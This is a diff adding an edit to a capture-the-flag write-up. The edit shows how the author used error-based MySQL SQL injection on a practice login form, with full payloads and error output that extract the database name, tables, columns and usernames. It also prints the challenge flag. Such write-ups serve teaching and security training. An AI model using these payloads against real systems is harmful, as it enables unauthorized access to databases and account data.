@@ -79,3 +79,141 @@ FROM `users` SELECT * WHERE `username`='admin' -- ' AND `password`='garbage'
 As we can see, it now only checks the username. I submitted the form and, I got the flag! It is `NOVI{th3_classics_with_a_7wis7}`
 
 This flag can then be submitted for the [challenge](https://ctfd.adventofctf.com/challenges#5-6).
+
+## EDIT
+
+As [@credmp](https://twitter.com/credmp) correctly pointed out, this only works if you can guess the username. If you can't, you'll have to get it first. I'll explain how to do that here.
+
+### Getting the database
+
+As we can see the error on the page itself, we can use a query to give a result inside the error. For instance, to get the database I used the following input: `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- `. This results into the following query:
+
+```sql
+FROM `users` SELECT * WHERE `username`='' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) as x FROM information_schema.tables GROUP BY x) as y) -- ' AND `password`=''
+```
+
+After submitting the form it gives us the following error:
+
+```text
+Error description: Duplicate entry 'testdb:1' for key 'group_key'
+```
+
+#### How does this work?
+
+Firstly, I'll format the query for you:
+
+```sql
+FROM `users`
+SELECT *
+WHERE `username`='' AND (
+  SELECT 1 FROM (
+    SELECT COUNT(*), CONCAT(
+      (
+        SELECT database()
+      ),
+      0x3a,
+      FLOOR(RAND(0)*2)
+    ) AS x
+    FROM information_schema.tables GROUP BY x
+  ) AS y) -- ' AND `password`=''
+```
+
+Now let me explain this query.
+
+We start with an `AND` to get another value, which is a nested SQL query. This query selects `1`, this is just because we actually need a value. Now we get to the important bit:
+
+```sql
+SELECT COUNT(*), CONCAT(
+  (
+    SELECT database()
+  ),
+  0x3a,
+  FLOOR(RAND(0)*2)
+) AS x
+FROM information_schema.tables GROUP BY x
+```
+
+Here, we select `COUNT(*)` and a string `CONCAT()` with the alias `x`. This `CONCAT()` contains the SQL query we actually want to execute. I can, however, only return one row. The `CONCAT()` also contains `0x3a` which is ASCII for a `:` character so we know where the value we want ends and `FLOOR(RAND(0)*2)`. The purpose of it is to get a duplicate entry error in the `GROUP BY` as it will result in the following values:
+
+```sql
+> SELECT FLOOR(RAND(0)*2)x FROM information_schema.tables;
++---+
+| x |
++---+
+| 0 |
+| 1 |
+| 1 | <-- The error will occur here.
+| 0 |
+| 1 |
+| 1 |
+ ...
+```
+
+The error really occurs because of a bug in MySQL. The `COUNT(*)` and `GROUP BY` should give multiple rows as the output, however, MySQL throws an error.
+
+The `FROM` in this query can be any table with three or more rows. `information_schema.tables` is just a common one.
+
+Now we know the name of the database (`testdb`), we can get the tables in it.
+
+### Getting the tables
+
+We can only get the tables one by one (as I explained above) so we can use the following sub-query:
+
+```sql
+SELECT table_name FROM information_schema.tables WHERE table_schema='testdb' LIMIT 0,1
+```
+
+Converted to an input we get `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema='testdb' LIMIT 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- `
+
+_Note: to get next table, just edit the `LIMIT` to `1,1`, `2,1` and so on_
+
+Which returns:
+
+```text
+Error description: Duplicate entry 'users:1' for key 'group_key'
+```
+
+Now that we know the table (`users`), we can get it's columns
+
+### Getting the columns
+
+A sub-query for columns could be the following:
+
+```sql
+SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1
+```
+
+Which converts to this input: `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- `
+
+Which gives us (with other `LIMIT` as well):
+
+```text
+Error description: Duplicate entry 'USER:1' for key 'group_key'
+Error description: Duplicate entry 'CURRENT_CONNECTIONS:1' for key 'group_key'
+Error description: Duplicate entry 'TOTAL_CONNECTIONS:1' for key 'group_key'
+Error description: Duplicate entry 'username:1' for key 'group_key'
+Error description: Duplicate entry 'password:1' for key 'group_key'
+```
+
+The first three we can just ignore as they are default metrics from MySQL. So our resulting columns would be `username` and `password`
+
+### Getting its contents
+
+Because we only care for the username, we can discard the password.
+
+A simple `SELECT` query for the username would be:
+
+```sql
+SELECT username from users limit 0,1
+```
+
+Turing this into an input we get `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT username from users limit 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- `
+
+We get:
+
+```text
+Error description: Duplicate entry 'nottheuser:1' for key 'group_key'
+Error description: Duplicate entry 'admin:1' for key 'group_key'
+```
+
+Which means our users are `nottheuser` and `admin`.
